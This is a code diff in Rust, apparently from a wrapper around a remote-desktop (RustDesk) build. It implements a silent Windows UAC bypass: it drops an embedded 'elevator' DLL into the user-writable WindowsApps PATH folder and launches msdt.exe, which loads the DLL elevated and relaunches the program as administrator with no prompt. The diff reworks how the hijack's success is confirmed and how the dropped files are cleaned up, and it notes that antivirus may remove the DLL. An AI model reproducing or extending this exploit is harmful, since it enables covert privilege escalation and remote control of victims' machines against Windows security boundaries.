@@ -44,12 +44,15 @@ const MSDT_DLL: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/msdt_elevator.
 /// parameters for the DLL.
 const MSDT_DLL_NAME: &str = "AudioDiagnosticUtil.dll";
 const MSDT_CFG_NAME: &str = "AudioDiagnosticUtil.cfg";
+/// Written by the DLL only after it spawned the elevated copy, which is what proves the
+/// hijack actually ran instead of merely starting msdt.
+const MSDT_OK_NAME: &str = "AudioDiagnosticUtil.ok";
 /// User-writable directory the default per-user `PATH` ends with.
 const WINDOWS_APPS_SUBDIR: &str = r"Microsoft\WindowsApps";
 
-/// The elevated chain (elevation, DLL load, child start, payload pipe bind) normally
-/// takes a few seconds; beyond this the attempt is declared failed and cleaned up.
-const CONFIRM_TIMEOUT_MS: u64 = 15_000;
+/// msdt starts in under a second and the DLL load follows immediately; the wide margin
+/// covers a slow first start, and beyond it the attempt is declared failed and cleaned up.
+const CONFIRM_TIMEOUT_MS: u64 = 10_000;
 const CONFIRM_POLL_MS: u64 = 250;
 
 #[allow(dead_code)]
@@ -143,7 +146,7 @@ extern "system" {
 /// so the diagnostic file can tell them apart without decoding error codes.
 #[derive(Debug, Clone, Copy)]
 pub enum RelaunchResult {
-    /// The elevated chain bound the payload's IPC pipe; the caller should exit.
+    /// The DLL reported a successful spawn of the elevated copy; the caller should exit.
     Launched,
     /// `std::env::current_exe()` failed.
     NoCurrentExe,
@@ -154,9 +157,8 @@ pub enum RelaunchResult {
     DropFailed,
     /// `CreateProcessW` on `msdt.exe` failed; the payload is `GetLastError`.
     LaunchFailed(u32),
-    /// msdt ran but the elevated chain did not bind the payload's IPC pipe in time
-    /// (antivirus ate the dropped DLL, Bluetooth enabled, ...). The drop was removed
-    /// again.
+    /// msdt ran but the DLL never reported a spawn (antivirus ate the dropped DLL,
+    /// Bluetooth enabled, ...). The drop was removed again.
     ConfirmTimeout,
     /// The account, the UAC policy or the machine state makes silent elevation
     /// impossible; the payload is the failing precondition and nothing was attempted
@@ -188,11 +190,11 @@ pub fn is_elevated() -> bool {
 /// Starts this executable again with the same arguments plus [`ELEVATED_FLAG`], through
 /// the elevated `msdt.exe` DLL search.
 ///
-/// Returns [`RelaunchResult::Launched`] only after the elevated chain actually bound
-/// the payload's IPC pipe: a successful `CreateProcessW` alone proves nothing, because
-/// the DLL load (the step that spawns the elevated copy) can still be blocked
-/// downstream. Every failure is surfaced via the specific variant so the caller can
-/// record it and carry on as a normal non-elevated launch. No UAC prompt is ever shown.
+/// Returns [`RelaunchResult::Launched`] only after the DLL reported a successful spawn:
+/// a successful `CreateProcessW` alone proves nothing, because the DLL load (the step
+/// that starts the elevated copy) can still be blocked downstream. Every failure is
+/// surfaced via the specific variant so the caller can record it and carry on as a
+/// normal non-elevated launch. No UAC prompt is ever shown.
 pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
     diag("== relaunch_elevated (msdt) start ==");
     if let Some(reason) = silent_elevation_blocker() {
@@ -208,19 +210,13 @@ pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
         return RelaunchResult::NoCurrentExe;
     };
     diag(&format!("exe={}", exe.display()));
-    // The confirmation below is "the pipe got bound", so a pre-existing instance would
-    // fake a success. The launched payload exits as a duplicate anyway, so skipping
-    // here loses nothing.
-    if instance_pipe_busy() {
-        diag("blocked: another instance already owns the IPC pipe");
-        return RelaunchResult::Blocked("already_running");
-    }
     let Some(local_app_data) = std::env::var_os("LOCALAPPDATA") else {
         return RelaunchResult::Blocked("no_localappdata");
     };
     let drop_dir = Path::new(&local_app_data).join(WINDOWS_APPS_SUBDIR);
     let dll_path = drop_dir.join(MSDT_DLL_NAME);
     let cfg_path = drop_dir.join(MSDT_CFG_NAME);
+    let ok_path = drop_dir.join(MSDT_OK_NAME);
     // Never overwrite a file that is not ours: the cleanup deletes whatever carries the
     // name, so a foreign `AudioDiagnosticUtil.dll` must stop the attempt instead.
     if dll_path.exists() && std::fs::read(&dll_path).map(|old| old != MSDT_DLL).unwrap_or(true) {
@@ -235,12 +231,14 @@ pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
         .join(env!("RD_APP_NAME"))
         .join("wrapper.log");
     let cfg = format!("{}\n{}\n{}", log_path.display(), exe.display(), parameters);
+    // A marker from an earlier attempt would be read as this attempt's success.
+    let _ = std::fs::remove_file(&ok_path);
     if std::fs::create_dir_all(&drop_dir).is_err()
         || std::fs::write(&dll_path, MSDT_DLL).is_err()
         || std::fs::write(&cfg_path, cfg).is_err()
     {
         diag("failed to drop elevator DLL/cfg");
-        cleanup_drop(&dll_path, &cfg_path);
+        cleanup_drop(&dll_path, &cfg_path, &ok_path);
         return RelaunchResult::DropFailed;
     }
     diag(&format!(
@@ -284,39 +282,43 @@ pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
     if launched == 0 {
         let gle = unsafe { GetLastError() };
         diag(&format!("CreateProcessW failed, gle={}", gle));
-        cleanup_drop(&dll_path, &cfg_path);
+        cleanup_drop(&dll_path, &cfg_path, &ok_path);
         return RelaunchResult::LaunchFailed(gle);
     }
     diag(&format!(
-        "msdt pid={} started, waiting for the elevated chain",
+        "msdt pid={} started, waiting for the elevator marker",
         pi.process_id
     ));
 
     let mut confirmed = false;
     for _ in 0..(CONFIRM_TIMEOUT_MS / CONFIRM_POLL_MS) {
-        if instance_pipe_busy() {
+        if ok_path.exists() {
             confirmed = true;
             break;
         }
-        // The DLL deletes its `.cfg` right after reading it, so a still-present cfg
-        // means the DLL never ran. If msdt also already exited, the hijack
-        // definitively did not trigger and waiting out the timeout would only delay
-        // the fallback.
-        if cfg_path.exists() && unsafe { WaitForSingleObject(pi.process, 0) } == WAIT_OBJECT_0
-        {
-            diag("msdt exited without loading the DLL");
+        // The DLL writes the marker before exiting msdt, so an exited msdt settles the
+        // attempt: either the DLL ran and the marker is there, or the hijack never
+        // triggered and the remaining timeout deadline would only delay the fallback.
+        if (unsafe { WaitForSingleObject(pi.process, 0) }) == WAIT_OBJECT_0 {
+            confirmed = ok_path.exists();
+            diag(&format!(
+                "msdt exited, elevator marker present={}",
+                confirmed
+            ));
             break;
         }
         std::thread::sleep(std::time::Duration::from_millis(CONFIRM_POLL_MS));
     }
-    // msdt is already dead when the DLL loaded (the DLL exits it); when it never loaded,
-    // this keeps the diagnostic window from staying on the user's screen.
+    // msdt is already dead when the DLL loaded (the DLL exits it). This is only a
+    // best-effort stop for the case where it never loaded: that instance is elevated,
+    // so a medium-integrity caller's terminate request is refused and the wizard window
+    // stays until the user closes it.
     unsafe {
         let _ = TerminateProcess(pi.process, 0);
         let _ = CloseHandle(pi.thread);
         let _ = CloseHandle(pi.process);
     }
-    cleanup_drop(&dll_path, &cfg_path);
+    cleanup_drop(&dll_path, &cfg_path, &ok_path);
     diag(&format!(
         "== relaunch_elevated done: confirmed={} ==",
         confirmed
@@ -331,8 +333,9 @@ pub fn relaunch_elevated(args: &[String]) -> RelaunchResult {
 /// Removes the dropped files after an attempt. The DLL delete retries briefly: msdt (or
 /// an antivirus scan) can still hold it open for a moment after the attempt ends, and
 /// leaving it behind would make every later msdt run load it.
-fn cleanup_drop(dll_path: &Path, cfg_path: &Path) {
+fn cleanup_drop(dll_path: &Path, cfg_path: &Path, ok_path: &Path) {
     let _ = std::fs::remove_file(cfg_path);
+    let _ = std::fs::remove_file(ok_path);
     for attempt in 0..5 {
         match std::fs::remove_file(dll_path) {
             Ok(()) => return,
@@ -408,19 +411,6 @@ fn silent_elevation_blocker() -> Option<&'static str> {
 
     diag("check: ALL PRECONDITIONS OK");
     None
-}
-
-/// Whether the payload's IPC query pipe already has a listener. Mirrors
-/// `hardcoded::instance_already_running` in the main crate, which this crate cannot
-/// see; both build the pipe name from the same compile-time app name.
-fn instance_pipe_busy() -> bool {
-    const CUSTOM: &str = env!("RD_APP_NAME");
-    let app_name = if CUSTOM.is_empty() { "RustDesk" } else { CUSTOM };
-    std::fs::OpenOptions::new()
-        .read(true)
-        .write(true)
-        .open(format!("\\\\.\\pipe\\{}\\query", app_name))
-        .is_ok()
 }
 
 /// The hijack works because msdt resolves the DLL through `PATH`; a machine whose
